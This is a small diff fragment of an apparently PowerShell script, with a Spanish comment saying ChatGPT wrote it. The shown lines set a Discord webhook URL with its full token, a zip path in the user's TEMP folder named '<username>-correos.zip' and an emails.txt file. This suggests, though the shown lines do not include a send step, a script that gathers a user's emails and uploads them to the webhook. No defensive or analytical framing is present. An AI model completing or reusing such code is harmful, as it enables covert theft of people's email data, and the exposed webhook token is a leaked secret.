@@ -11,6 +11,8 @@
 
 # si xavi, me lo ha hecho el chatgpt
 
+
+
 $webhookUrl = "https://discord.com/api/webhooks/1360605534838980780/BwDz68YsJ0nzDqi2eVFbZ6yWivXquWoUEIcc9hVBxBVLKiQnSGy8oDoccu2ctIy8HMtJ"
 $zipFile = "$env:TEMP\$env:USERNAME-correos.zip"
 $emailsFile = "$env:TEMP\emails.txt"
